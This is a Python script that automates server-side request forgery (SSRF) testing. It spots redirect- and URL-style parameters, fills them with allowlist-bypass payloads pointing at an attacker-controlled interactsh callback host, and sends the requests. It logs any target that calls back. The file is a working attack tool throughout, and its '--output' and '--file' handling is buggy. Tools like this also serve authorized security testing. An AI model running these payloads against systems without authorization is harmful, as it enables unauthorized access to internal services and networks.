import regex
import argparse
import requests
import time
import os

parser = argparse.ArgumentParser()
parser.add_argument("--file", "-f", type=str, required=False, help= 'file of all URLs to be tested against SSRF')
parser.add_argument("--url", "-u", type=str, required=False, help= 'url to be tested against SSRF')
parser.add_argument("--output", "-o", action='store_true', help='output file path')
parser.add_argument("--verbose", "-v", action='store_true', help='activate verbose mode')

args = parser.parse_args()

if not (args.file or args.url):
    parser.error('No input selected: Please add --file or --url as arguments.')

if not os.path.isdir('output'):
    os.system("mkdir output")

if args.output:
    outputFile = open(args.output, "a")
else:
    outputFile = open("output/ssrf-result.txt", "a")

regexMultipleParams = '(?<=(access|admin|dbg|debug|edit|grant|test|alter|clone|create|delete|disable|enable|exec|execute|load|make|modify|rename|reset|shell|toggle|adm|root|cfg|dest|redirect|uri|path|continue|url|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|php_path|style|doc|img|filename)=)(.*)(?=&)'

regexSingleParam = '(?<=(access|admin|dbg|debug|edit|grant|test|alter|clone|create|delete|disable|enable|exec|execute|load|make|modify|rename|reset|shell|toggle|adm|root|cfg|dest|redirect|uri|path|continue|url|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|php_path|style|doc|img|filename)=)(.*)'

os.system("./tools/interactsh-client -pi 1 &> output/interaction-logs.txt &")
time.sleep(3)

extractInteractionServerURL = "(?<=] )([a-z0-9][a-z0-9][a-z0-9].*)"

interactionLogs = open("output/interaction-logs.txt", "r")
fileContent = interactionLogs.read()
pastInteractionLogsSize = len(fileContent)
interactionServer = regex.search(extractInteractionServerURL, fileContent).group()
interactionLogs.close()

def generatePayloads(whitelistedHost, interactionHost):
    generated =[
    f"http://{interactionHost}",
    f"//{interactionHost}",
    f"http://{whitelistedHost}.{interactionHost}",       # whitelisted.attacker.com
    f"http://{interactionHost}?{whitelistedHost}",
    f"http://{interactionHost}/{whitelistedHost}",
    f"http://{interactionHost}%ff@{whitelistedHost}",
    f"http://{interactionHost}%ff.{whitelistedHost}",
    f"http://{whitelistedHost}%25253F@{interactionHost}",
    f"http://{whitelistedHost}%253F@{interactionHost}",
    f"http://{whitelistedHost}%3F@{interactionHost}",
    f"http://{whitelistedHost}@{interactionHost}",
    f"http://foo@{interactionHost}:80@{whitelistedHost}",
    f"http://foo@{interactionHost}%20@{whitelistedHost}",
    f"http://foo@{interactionHost}%09@{whitelistedHost}"
    ]
    return generated

def smart_extract_host(url, matchedElement):
    urlDecodedElem = requests.utils.unquote(matchedElement)
    hostExtractorRegex = '(?<=(https|http):\/\/)(.*?)(?=\/)'
    extractedHost = regex.search(hostExtractorRegex, urlDecodedElem)
    if not extractedHost:
        extractedHost = regex.search(hostExtractorRegex, url)

    return extractedHost.group()

def fuzz_SSRF(url):

    matching = regex.search(regexSingleParam, url, regex.IGNORECASE)
    matchedElem = matching if matching else regex.search(regexMultipleParams, url, regex.IGNORECASE)
    if not matchedElem:
        return
    matchedElem = matchedElem.group()
    host = smart_extract_host(url , matchedElem)
    payloadsList = generatePayloads(host, interactionServer)
    url = url.replace(matchedElem, "???")

    for payload in payloadsList:
        fuzz_and_detect_with_payload("FUZZ", url, payload)

    time.sleep(2)

    if isInteractionDetected():
        if args.verbose:
            print(f"\nSSRF identified in {url}. Determining valid payload ...")
        for payload in payloadsList:
            if fuzz_and_detect_with_payload("DETECT", url, payload):
                print(f"SSRF detected in {url} with payload {payload}.")
                outputFile.write(f"SSRF detected in {url} with payload {payload}\n")
                return
    else:
        if args.verbose:
            print("\nNothing detected for the given URL.")

def fuzz_and_detect_with_payload(type ,url, payload) :
    fuzzedUrl = url.replace('???', payload)
    if args.verbose:
        print(f"Testing payload: {payload}                                                          ", end="\r")
    requests.get(fuzzedUrl)
    if type == "DETECT":
        time.sleep(2)
        return isInteractionDetected()

def isInteractionDetected():
    global pastInteractionLogsSize
    currentInteractionLogs = open("output/interaction-logs.txt", "r")
    currentInteractionLogsSize = len(currentInteractionLogs.read())
    currentInteractionLogs.close()

    if currentInteractionLogsSize != pastInteractionLogsSize:
        pastInteractionLogsSize = currentInteractionLogsSize
        return True

    return False

def main():
    if args.url:
        try:
            fuzz_SSRF(args.url)
        except:
            print("\nInvalid URL")
    elif args.file:
        for url in args.file:
            try:
                fuzz_SSRF(url)
            except:
                continue
main()